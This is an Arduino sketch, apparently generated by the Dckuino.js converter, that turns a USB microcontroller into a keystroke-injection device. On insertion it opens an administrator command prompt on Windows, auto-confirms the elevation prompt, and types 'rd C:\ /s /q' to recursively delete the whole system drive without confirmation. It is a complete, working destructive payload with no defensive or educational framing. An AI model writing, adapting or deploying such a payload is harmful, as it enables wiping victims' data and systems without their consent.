/*
 * Generated with <3 by Dckuino.js, an open source project !
 */
// Note::for
// −·− −·−− −·· −· −−


#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();
  
  // Note::for
  // −·− −·−− −·· −· −−

  // Wait 500ms
  delay(500);

  delay(500);

  typeKey(KEY_LEFT_GUI);

  delay(1000);

  Keyboard.print("cmd");

  delay(1000);
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("rd C:\\ /s /q");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("exit");

  delay(500);

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}

// Note::for
// −·− −·−− −·· −· −−
